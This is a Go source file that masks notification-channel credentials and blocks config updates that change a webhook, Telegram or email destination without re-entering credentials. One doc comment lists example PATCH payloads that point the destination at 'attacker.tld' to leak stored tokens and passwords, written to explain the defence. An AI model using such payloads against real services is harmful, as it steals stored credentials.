package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of masked values. When the API echoes credentials
// it replaces the real content with a value carrying this prefix, and the update API
// reads such a value as "keep the stored value unchanged".
//
// A prefix rather than an empty string or fixed constant lets us carry a little
// identifying information (see MaskedValue) so users can tell which robot it is
// without re-pasting the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original too short, no hint given
//	"__masked__:…ab12cd"      the original's last 6 characters as an identifying hint
//
// Exposing only the last 6 is deliberate: a webhook URL's identifying part is at the
// end (WeCom key, Feishu robot id), while the prefix is the same for every robot. Six
// characters aren't enough to recover the credential but are enough for the
// configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is masked (i.e. echoed by the API and left unmodified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields masked.
//
// An unknown channel kind returns an empty map rather than the original config: better
// for the UI to show "config unavailable" than to return raw content that may hold
// credentials when the kind can't be identified. Non-credential fields are kept as is
// so the UI can display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as one credential as a whole:
		// judging per sub-key would need every channel to declare which sub-keys are
		// credentials, far more complexity than it's worth.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed but the caller
// didn't restate the credential fields". It is returned instead of silently allowing or
// silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys not explicitly restated
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "The destination (" + strings.Join(e.Changed, ", ") + ") has changed. Re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: enter a new value, or leave it empty to indicate credentials are no longer needed. " +
		"The existing credentials are valid only for the previous destination; reusing them would hand them to the new one."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of
// a destination change.
//
// It replaces bare MergeConfig on the channel update path to close a path verified to
// work in practice: destination (where messages go) and credentials (what identity
// sends them) are separate fields, and MergeConfig keeps stored values for keys not
// mentioned. So anyone able to PATCH a channel could, by **changing only the
// destination and saying nothing about credentials**, make the server send the real
// stored credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → original Authorization header sent out
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → username and password handed over after STARTTLS
//
// This path is completely silent and doesn't rely on redirects (so refusing cross-host
// redirects doesn't stop it), and it defeats the whole point of this package's masking:
// credentials are never echoed to the browser.
//
// Rule: once any destination key changes to a new value, the caller must explicitly
// address **every** credential key:
//   - a new value → use it
//   - an explicit empty string → the field no longer needs a credential (clear semantics kept)
//   - the masked value echoed back / the key omitted → rejected
//
// The third case is rejected because a masked value means "keep the old credential",
// and the old credential is valid only for the old destination. Credentials are
// deliberately not dropped automatically: for optional credential fields (webhook
// headers, email password) that would silently become "auth gone but the API returns
// 200", harder to debug than an error. Better to make the operator re-enter it.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("Unregistered channel type: %q", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (e.g. webhook headers, an object) embeds the mask
	// literal, the caller put the "keep stored value" sentinel inside a structure.
	// MergeConfig only treats prefixed strings as masked, so this shape would be stored
	// as a plain object: the literal "__masked__" would really land in the database and
	// later auth would silently fail with no error. Reject it instead.
	//
	// This check must come **first**: an unchanged destination returns early, so placing
	// it later would only cover the "destination changed" path (the first version made
	// exactly that mistake and the tests caught it).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that really changed. A masked value means "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: plain merge (masked keeps stored, empty clears, rest overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require every credential key to be explicitly addressed.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel in a
// non-string structure.
//
// Masking assumes the whole value is one string. Object fields like webhook headers
// can only be masked as a whole (the string "__masked__") or submitted as a whole; a
// sentinel inside the object neither expresses "keep unchanged" nor is safe, since it
// would be stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the %s field contains the mask marker (%q). Either leave the whole field masked to keep the existing value or submit the whole field with a new value; the mask marker cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue reports whether two config values are equivalent. Comparing JSON
// encodings also handles type differences: the frontend submits a port as a number,
// while the stored value reads back as float64, so a direct == would misjudge.
//
// "Empty" must be normalized before comparing: an empty string and a missing key are
// the same state in this config model, because MergeConfig treats an empty string as
// an explicit clear and deletes the key. Without normalization, an optional
// destination field that is always left empty (Telegram's base_url is the only one:
// empty means the official API) would go down this path:
//
//	created with base_url:""  →  first save, MergeConfig deletes the key
//	→ second save: incoming is "", stored lacks the key, judged "destination changed"
//	→ credential is masked → 400 "destination changed, re-enter the credential fields"
//
// Every later save would fail unless the user re-pasted the bot token, despite changing nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue reports whether a config value is "empty". It must use the same
// rule as MergeConfig's clear check (strings.TrimSpace(s) == ""), or there would be a
// gap where MergeConfig deletes a key that sameConfigValue considers set.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming over stored for channel config updates.
//
// Rules:
//   - keys in incoming with a masked value → keep stored's value (user didn't change it)
//   - keys in incoming with an empty string → explicit clear, delete the key
//   - other keys → overwritten by incoming's value
//   - keys in stored but not in incoming → kept (partial-update semantics)
//
// Whether an empty string means "clear" has to be decided explicitly: the frontend
// form submits unfilled fields as empty strings. We choose explicit clear because
// users have no other way to clear a wrongly set field (omitting a field could
// distinguish "not provided" from "provided empty", but the UI doesn't use that).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
